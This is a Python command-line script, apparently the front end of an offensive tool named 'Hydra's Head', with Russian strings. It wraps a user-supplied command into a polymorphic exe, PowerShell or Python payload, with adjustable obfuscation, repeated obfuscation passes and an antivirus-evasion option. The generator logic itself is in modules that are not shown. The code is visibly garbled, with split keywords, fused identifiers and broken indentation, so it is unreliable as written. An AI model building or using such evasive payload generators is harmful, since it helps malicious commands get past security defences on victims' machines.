







import os



import sys



import argparse











sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))







from core.managerimport PayloadManager



from core.configimport load_config







defbanner():



    pr in t("""
    ╦ ╦╦ ╦╔╦╗╦═╗╔═╗╔═╗  ╦ ╦╔═╗╔═╗╔╦╗ - COMMAND PAYLOAD
    ╠═╣╚╦╝ ║║╠╦╝╠═╣╚═╗  ╠═╣║╣ ╠═╣ ║║
    ╩ ╩ ╩ ═╩╝╩╚═╩ ╩╚═╝  ╩ ╩╚═╝╩ ╩═╩╝
    Пример создания полиморфной нагрузки с выполнением команды
    """)







defparse_arguments():



    parser=argparse.ArgumentParser(description="Hydra's Head Command Payload Generator")







parser.add_argument("--command","-c",required=True,



help="Команда для выполнения (например, 'cmd.exe /c calc.exe')")



parser.add_argument("--output","-o",required=True,



help="Имя выходного файла")



parser.add_argument("--obfuscation",choices=["low","medium","high","max"],



default="medium",



help="Уровень обфускации")



parser.add_argument("--type","-t",choices=["exe","ps1","py"],



default="exe",



help="Тип выходного файла")



parser.add_argument("--evas ion",action="store_true",



help="Добавить техники обхода обнаружения")



parser.add_argument("--iterations","-i",type=int,default=1,



help="Количество итераций обфускации")







return parser.parse_args()







defmain():



    banner()



args=parse_arguments()







try:







        config=load_config()



manager=PayloadManager(config)











pr in t(f"[+] Тип нагрузки: {args.type}")



pr in t(f"[+] Команда: {args.command}")



pr in t(f"[+] Уровень обфускации: {args.obfuscation}")



pr in t(f"[+] Техники обхода: {'Включены' if args.evas ion else 'Отключены'}")



pr in t(f"[+] Итерации обфускации: {args.iterations}")



pr in t(f"[+] Выходной файл: {args.output}")







pr in t("\n[+] Генерация полиморфной нагрузки...")











manager.generate(



payload_type=args.type,



payload=args.command,



output_path=args.output,



obfuscation_level=args.obfuscation,



use_evas ion=args.evas ion,



iterations=args.iterations



)







pr in t(f"[+] Нагрузка успешно сгенерирована: {args.output}")



pr in t(f"[+] При запуске будет выполнена команда: {args.command}")







except Exceptionas e:



        pr in t(f"[-] Ошибка при создании нагрузки: {str(e)}")



return1







return0







if__name__=="__main__":



    sys.exit(main())